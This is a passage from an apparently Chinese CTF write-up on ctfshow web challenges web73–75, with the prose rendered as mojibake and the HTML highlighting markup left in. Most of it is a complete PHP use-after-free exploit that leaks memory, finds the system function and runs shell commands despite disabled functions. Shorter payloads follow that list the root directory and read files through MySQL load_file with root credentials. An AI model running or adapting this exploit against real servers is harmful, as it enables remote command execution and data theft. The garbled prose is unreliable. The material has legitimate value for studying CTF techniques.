class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">length</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$length</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10000</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$length</span> += <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$length</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">length</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">length</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">length</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flagc.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è®¿é—®ä¹‹åä¼š502ï¼Œçœ‹äº†è§†é¢‘å‘ç°ä¹Ÿæ˜¯502</p><h1 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h1><p>å…ˆæ‰«ç›®å½•æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ–‡ä»¶è¢«ä¿®æ”¹ä¸ºflagx.txtï¼Œç›´æ¥åƒä¸Šä¸€é“é¢˜ä¸€æ ·includeæ–‡ä»¶åŒ…å«å°±è¡Œã€‚</p><h1 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h1><p>å…ˆçœ‹æ–‡ä»¶ç›®å½•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>æŠ½è±¡ï¼Œçœ‹äº†è§†é¢‘è¯´ç›´æ¥ä½¿ç”¨æ•°æ®åº“ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä»–å¹¶æ²¡æœ‰æè¿™ä¸ªæ•°æ®åº“åç§°æ˜¯æ€ä¹ˆæ¥çš„ã€‚<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡é€šç”¨çš„æ•°æ®åº“æ¥è·å–åˆ°æ•°æ®åº“çš„åç§°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 